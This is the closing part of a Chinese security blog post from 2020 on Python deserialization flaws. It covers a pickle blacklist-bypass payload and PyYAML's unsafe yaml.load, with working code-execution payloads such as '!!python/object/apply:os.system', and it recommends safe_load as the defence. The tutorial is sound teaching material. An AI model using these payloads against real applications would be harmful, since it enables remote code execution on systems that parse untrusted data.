+tRtRc__builtin__
+globals
+(tRS&#39;&#39;
+tR(tR.&quot;&quot;&quot;
+
+data = pickle.loads(payload)
+print(data)
+</code></pre><p>于是又有一个黑名单绕过执行函数的方式。</p>
+<h3 id="PyYAML"><a href="#PyYAML" class="headerlink" title="PyYAML"></a>PyYAML</h3><p>yaml和xml、json等类似，都是标记类语言，有自己的语法格式。各个支持yaml格式的语言都会有自己的实现来进行yaml格式的解析（读取和保存），其中PyYAML就是python的一个yaml库。</p>
+<p>除了 YAML 格式中常规的列表、字典和字符串整形等类型转化外（基本数据类型），各个语言的 YAML 解析器或多或少都会针对其语言实现一套特殊的<strong>对象转化规则</strong>（也就是序列化和反序列化，这是关键点，是这个漏洞存在的前提)。</p>
+<p>使用了<code>yaml.load</code>而不是<code>yaml.safe_load</code>函数来解析yaml文件的程序，<code>yaml.load</code>和<code>pickle.load</code>具有一样的功能，可以调用所有python函数。</p>
+<p><code>yaml.load</code> 函数的作用是用来将YAML文档转化成Python对象。</p>
+<pre><code>&gt;&gt;&gt; yaml.load(&quot;&quot;&quot;- 111&quot;&quot;&quot;)
+[111]
+&gt;&gt;&gt; yaml.load(&quot;&quot;&quot;111&quot;&quot;&quot;)
+111
+</code></pre><p>如果字符串或者文件中包含多个YAML文档，那么可以使用 <code>yaml.load_all</code> 函数将它们全部反序列化</p>
+<pre><code>&gt;&gt;&gt; cp = &quot;&quot;&quot;
+... aaaa
+... ---
+... bbbb
+... ---
+... cccc
+... &quot;&quot;&quot;
+&gt;&gt;&gt; yaml.load_all(cp)
+&lt;generator object load_all at 0x0000026FBEBDD390&gt;
+&gt;&gt;&gt; for i in yaml.load_all(cp):
+...     print(i)
+...
+aaaa
+bbbb
+cccc
+</code></pre><p>yaml标签和python对象的关系，部分关系，详细<a href="https://pyyaml.org/wiki/PyYAMLDocumentation" target="_blank" rel="noopener">https://pyyaml.org/wiki/PyYAMLDocumentation</a></p>
+<pre><code>!!str    str或unicode
+!!map    dict
+!!python/str    str
+!!python/dict    dict
+!!python/name:module.name    module.name
+!!python/module:package.module    package.module
+!!python/object:module.cls    module.cls 
+!!python/object/new:module.cls    module.cls 
+!!python/object/apply:module.f    
+</code></pre><p>可以使用<code>!!python/object</code>序列化任意对象。</p>
+<pre><code>!!python/object:module.Class { attribute: value, ... }
+</code></pre><p>为了支持pickle协议，提供了两种附加形式的<code>!!python/object</code>标签</p>
+<pre><code>!!python/object/new:module.Class
+args: [argument, ...]
+kwds: {key: value, ...}
+state: ...
+listitems: [item, ...]
+dictitems: [key: value, ...]
+
+!!python/object/apply:module.function
+args: [argument, ...]
+kwds: {key: value, ...}
+state: ...
+listitems: [item, ...]
+dictitems: [key: value, ...]
+</code></pre><p>构造一个序列化，dump的结果就是上面的标签形式。</p>
+<pre><code>#coding:utf-8
+import yaml,os
+
+
+class test:
+    def __init__(self):
+        os.system(&#39;whoami&#39;)
+
+payload = yaml.dump(test())
+print(payload)
+yaml.load(payload)
+
+#misaki\user
+#!!python/object:__main__.test {}
+</code></pre><p>直接发送一个序列化值</p>
+<pre><code>cp = &quot;&quot;&quot;!!python/object/apply:os.system [&#39;whoami&#39;]&quot;&quot;&quot;
+#cp = &quot;&quot;&quot;!!python/object/new:os.system [&#39;whoami&#39;]&quot;&quot;&quot;
+yaml.load(cp)
+
+#misaki\user
+</code></pre><p>不过此处并不能直接使用<code>!!python/object:</code>，因为它接收的是一个dict类型的对象属性。并不接收args的列表参数。当调用<code>yaml.load</code>的时候是使用<code>!!python/object</code>来处理。</p>
+<p>避免此问题可以使用<code>safe_load</code>来替换<code>load</code>，该函数<code>yaml.safe_load</code>将此功能限制为简单的Python对象（例如整数或列表）。</p>
+<pre><code>cp = &quot;&quot;&quot;
+!!python/object/apply:os.system [&#39;whoami&#39;]
+&quot;&quot;&quot;
+yaml.safe_load(cp)
+
+#yaml.constructor.ConstructorError: could not determine a constructor for the tag
+</code></pre><p>文章参考：<a href="https://xz.aliyun.com/t/2289" target="_blank" rel="noopener">Python反序列化漏洞的花式利用</a>，<a href="https://xz.aliyun.com/t/7436" target="_blank" rel="noopener">pickle反序列化初探</a>，<a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">Python Pickle的任意代码执行漏洞实践和Payload构造</a>，<a href="https://segmentfault.com/a/1190000013099825" target="_blank" rel="noopener">Python反序列化安全问题</a>，<a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">Code-Breaking中的两个Python沙箱</a>，<a href="https://checkoway.net/musings/pickle/" target="_blank" rel="noopener">Arbitrary code execution with Python pickles</a>，<a href="http://www.polaris-lab.com/index.php/archives/375/" target="_blank" rel="noopener">Python PyYAML反序列化漏洞实验和Payload构造</a></p>
+
+          </div>
+          <br><br>
+              
+                <div class="license-wrapper">
+                    <p>原文作者：<a href="">Misaki</a>
+                    <p>原文链接：<a href="/2020/04/python-反序列化/">/2020/04/python-反序列化/</a>
+                    <p>发表日期：<a href="/2020/04/python-反序列化/">April 26th 2020, 3:11:44 pm</a>
+                    <p>更新日期：<a href="/2020/04/python-反序列化/">May 6th 2020, 4:46:34 pm</a>
+                    <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                </div>
+              
+          <br><br>
+          <div>
+              <p>
+                       
+                      <span class="badge badge-default">#&nbsp;python</span>
+                      &nbsp;
+                      
+              </p>
+          </div>
+        </div>
+      </div>  
+    </div>
+  </div>
+  <!-- TOC -->
+  
+      <div class="">
+        <div id="toc">
+          <p class="toc-title"><i class="material-icons" style="vertical-align:middle">toc</i>Toc:</p> 
+          <div id="tocbot"></div>
+        </div>
+      </div>
+  
+</div>
+
+
+<!-- Comments -->
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+    
+        
+            <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>               
+        var disqus_shortname = '';
+        var disqus_config = function () {
+            this.page.url = '/2020/04/python-反序列化/'; 
+            this.page.identifier = '/2020/04/python-反序列化/';
+        };
+        (function() { 
+            var d = document, s = d.createElement('script');
+            s.type = 'text/javascript';
+            s.src = '//'+disqus_shortname+'.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+</div>
+        
+    
+    </div>
+</div>
+  
+
+<footer class="footer footer-default">
+        <div class="container">
+          <div class="float-left" style="padding: 15px 0;">
+              <b>假如今天的你被生活辜负了，别伤心，因为明天生活还会继续辜负你！</b>
+          </div>
+          <div align="right" style="padding: 15px 0;">
+              <i class="iconfont icon-love" ></i>
+              <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+          </div>
+        </div>
+</footer>
+      <!--   Core JS Files   -->
+      <script src="/js/core/jquery.min.js?v=3.2.1"></script>
+      <script src="/js/main.js"></script>
+      <script src="/js/core/popper.min.js"></script>
+      <script src="/js/core/bootstrap-material-design.min.js"></script>
+      <script src="/js/plugins/moment.min.js"></script>
+      <script src="/js/material-kit.min.js?v=2.0.5"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+        <script src="/js/post.js"></script>
+        <script src="/js/plugins/prettify.js"></script>
+        <script>
+            $(document).ready(function(){
+                $('pre').addClass('prettyprint linenums');
+                prettyPrint();
+            })
+        </script>
+      
+<script src="/live2d-widget/autoload.js"></script>
+</body>
+</html>
